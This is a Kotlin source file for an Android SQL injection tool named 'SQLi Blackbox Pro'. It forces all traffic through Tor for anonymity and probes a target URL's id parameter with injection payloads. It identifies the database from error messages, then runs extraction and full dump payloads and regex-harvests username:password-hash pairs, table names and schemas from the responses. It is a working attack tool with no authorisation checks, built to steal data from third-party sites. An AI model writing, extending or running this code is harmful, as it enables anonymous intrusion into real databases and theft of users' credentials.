package com.sqliblackboxpro

import android.util.Log
import okhttp3.*
import java.net.InetSocketAddress
import java.net.Proxy
import java.net.Socket
import java.util.concurrent.TimeUnit

class SQLScanner {
    
    private val TAG = "SQLScanner"
    
    // FAIL-CLOSED: Only Tor client is available
    // All traffic MUST go through Tor SOCKS proxy at 127.0.0.1:9050
    private val torClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .proxy(Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)))
        .build()
    
    /**
     * Verify Tor is running before allowing scan
     * Fail-closed security: Refuse to run if Tor is not active
     */
    private suspend fun verifyTorConnection(): Boolean {
        return try {
            Socket("127.0.0.1", 9050).use { socket ->
                val isConnected = socket.isConnected
                Log.d(TAG, "Tor verification: ${if (isConnected) "ACTIVE" else "INACTIVE"}")
                isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Tor verification FAILED: ${e.message}")
            false
        }
    }
    
    suspend fun scanURL(url: String): ScanResult {
        // FAIL-CLOSED ENFORCEMENT: Verify Tor is running
        if (!verifyTorConnection()) {
            throw SecurityException("FAIL-CLOSED: Tor is not running. Cannot proceed without Tor for anonymity.")
        }
        
        // Only Tor client is used - fail-closed architecture
        val client = torClient
        
        var vulnerabilityFound = false
        var detectedDatabase = DatabaseType.UNKNOWN
        var successfulPayload = ""
        var responseDetails = ""
        val extractedData = mutableListOf<String>()
        var databaseDump: DatabaseDump? = null
        
        // Test detection payloads first
        for (payload in SQLPayloads.DETECTION_PAYLOADS) {
            try {
                val testUrl = buildTestUrl(url, payload)
                val request = Request.Builder()
                    .url(testUrl)
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                // Check for SQL errors in response
                if (containsSQLError(body)) {
                    vulnerabilityFound = true
                    detectedDatabase = detectDatabaseType(body)
                    successfulPayload = payload
                    responseDetails = body.take(500)
                    break
                }
            } catch (e: Exception) {
                // Continue testing other payloads
            }
        }
        
        // If vulnerability found, try to extract data AND perform database dump
        if (vulnerabilityFound) {
            val extractionPayloads = when (detectedDatabase) {
                DatabaseType.MYSQL -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
                DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_EXTRACTION_PAYLOADS
                DatabaseType.MSSQL -> SQLPayloads.MSSQL_EXTRACTION_PAYLOADS
                else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS // Default to MySQL payloads
            }
            
            for (payload in extractionPayloads.take(3)) { // Try first 3 extraction payloads
                try {
                    val testUrl = buildTestUrl(url, payload)
                    val request = Request.Builder()
                        .url(testUrl)
                        .build()
                    
                    val response = client.newCall(request).execute()
                    val body = response.body?.string() ?: ""
                    response.close()
                    
                    // Try to extract data from response
                    val extracted = extractDataFromResponse(body)
                    if (extracted.isNotEmpty()) {
                        extractedData.addAll(extracted)
                    }
                } catch (e: Exception) {
                    // Continue with next payload
                }
            }
            
            // Perform comprehensive database dump
            databaseDump = performDatabaseDump(client, url, detectedDatabase)
        }
        
        return ScanResult(
            isVulnerable = vulnerabilityFound,
            databaseType = detectedDatabase,
            extractedData = extractedData,
            payloadUsed = successfulPayload,
            responseDetails = responseDetails,
            databaseDump = databaseDump
        )
    }
    
    /**
     * Perform comprehensive database dump for vulnerable targets
     */
    private suspend fun performDatabaseDump(
        client: OkHttpClient,
        url: String,
        dbType: DatabaseType
    ): DatabaseDump {
        val users = mutableListOf<String>()
        val tables = mutableListOf<String>()
        val schemas = mutableListOf<String>()
        val allDataBuilder = StringBuilder()
        
        allDataBuilder.append("=== DATABASE DUMP ===\n")
        allDataBuilder.append("Database Type: ${dbType.name}\n")
        allDataBuilder.append("Target URL: $url\n")
        allDataBuilder.append("Timestamp: ${System.currentTimeMillis()}\n\n")
        
        // Get database-specific dump payloads
        val dumpPayloads = when (dbType) {
            DatabaseType.MYSQL -> SQLPayloads.MYSQL_DUMP_PAYLOADS
            DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_DUMP_PAYLOADS
            DatabaseType.MSSQL -> SQLPayloads.MSSQL_DUMP_PAYLOADS
            DatabaseType.ORACLE -> SQLPayloads.ORACLE_DUMP_PAYLOADS
            else -> SQLPayloads.MYSQL_DUMP_PAYLOADS // Default
        }
        
        // Execute dump payloads
        for ((index, payload) in dumpPayloads.withIndex()) {
            try {
                val testUrl = buildTestUrl(url, payload)
                val request = Request.Builder()
                    .url(testUrl)
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                if (body.isNotEmpty()) {
                    allDataBuilder.append("--- Payload ${index + 1} Result ---\n")
                    allDataBuilder.append("Payload: $payload\n")
                    allDataBuilder.append("Response:\n$body\n\n")
                    
                    // Parse and categorize results
                    val extractedUsers = extractUsers(body)
                    val extractedTables = extractTables(body)
                    val extractedSchemas = extractSchemas(body)
                    
                    users.addAll(extractedUsers)
                    tables.addAll(extractedTables)
                    schemas.addAll(extractedSchemas)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Dump payload failed: ${e.message}")
            }
        }
        
        allDataBuilder.append("=== END DATABASE DUMP ===\n")
        
        return DatabaseDump(
            users = users.distinct(),
            tables = tables.distinct(),
            schemas = schemas.distinct(),
            allData = allDataBuilder.toString()
        )
    }
    
    private fun extractUsers(response: String): List<String> {
        val users = mutableListOf<String>()
        // Extract username:password patterns
        val userPattern = Regex("([a-zA-Z0-9_.-]+):(\\$[^\\s,]+|[a-f0-9]{32,})")
        userPattern.findAll(response).forEach { match ->
            users.add("${match.groupValues[1]}:${match.groupValues[2]}")
        }
        // Extract simple username lists
        val simpleUserPattern = Regex("user[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
        simpleUserPattern.findAll(response).forEach { match ->
            users.add(match.groupValues[1])
        }
        return users
    }
    
    private fun extractTables(response: String): List<String> {
        val tables = mutableListOf<String>()
        val tablePattern = Regex("table[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
        tablePattern.findAll(response).forEach { match ->
            tables.add(match.groupValues[1])
        }
        return tables
    }
    
    private fun extractSchemas(response: String): List<String> {
        val schemas = mutableListOf<String>()
        val schemaPattern = Regex("(schema|database)[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
        schemaPattern.findAll(response).forEach { match ->
            schemas.add(match.groupValues[2])
        }
        return schemas
    }
    
    private fun buildTestUrl(baseUrl: String, payload: String): String {
        val separator = if (baseUrl.contains("?")) "&" else "?"
        // Try multiple parameter injection points
        return "${baseUrl}${separator}id=${java.net.URLEncoder.encode(payload, "UTF-8")}"
    }
    
    private fun containsSQLError(response: String): Boolean {
        val errorPatterns = listOf(
            "SQL syntax",
            "mysql_fetch",
            "mysqli",
            "PostgreSQL",
            "pg_query",
            "ORA-",
            "Microsoft SQL",
            "ODBC SQL",
            "SQLite",
            "sqlite3",
            "Unclosed quotation",
            "syntax error",
            "Warning: mysql",
            "valid MySQL result",
            "MySqlClient",
            "SQL Server",
            "Driver.*SQL",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql\\.",
            "PG::SyntaxError",
            "org.postgresql.util.PSQLException",
            "com.mysql.jdbc.exceptions",
            "java.sql.SQLException"
        )
        
        return errorPatterns.any { pattern ->
            response.contains(pattern, ignoreCase = true)
        }
    }
    
    private fun detectDatabaseType(response: String): DatabaseType {
        return when {
            response.contains("mysql", ignoreCase = true) ||
            response.contains("mysqli", ignoreCase = true) -> DatabaseType.MYSQL
            
            response.contains("postgresql", ignoreCase = true) ||
            response.contains("pg_query", ignoreCase = true) ||
            response.contains("npgsql", ignoreCase = true) -> DatabaseType.POSTGRESQL
            
            response.contains("microsoft sql", ignoreCase = true) ||
            response.contains("sql server", ignoreCase = true) -> DatabaseType.MSSQL
            
            response.contains("ora-", ignoreCase = true) ||
            response.contains("oracle", ignoreCase = true) -> DatabaseType.ORACLE
            
            response.contains("sqlite", ignoreCase = true) -> DatabaseType.SQLITE
            
            else -> DatabaseType.UNKNOWN
        }
    }
    
    private fun extractDataFromResponse(response: String): List<String> {
        val extracted = mutableListOf<String>()
        
        // Look for common data patterns
        // Extract potential usernames
        val usernamePattern = Regex("([a-zA-Z0-9_-]+):(\\$[^\\s]+|[a-f0-9]{32,})")
        usernamePattern.findAll(response).forEach { match ->
            extracted.add("User: ${match.groupValues[1]}, Hash: ${match.groupValues[2]}")
        }
        
        // Extract database names
        val dbNamePattern = Regex("database[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
        dbNamePattern.findAll(response).forEach { match ->
            extracted.add("Database: ${match.groupValues[1]}")
        }
        
        // Extract table names  
        val tablePattern = Regex("table[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
        tablePattern.findAll(response).forEach { match ->
            extracted.add("Table: ${match.groupValues[1]}")
        }
        
        return extracted.take(10) // Limit to first 10 extractions
    }
}
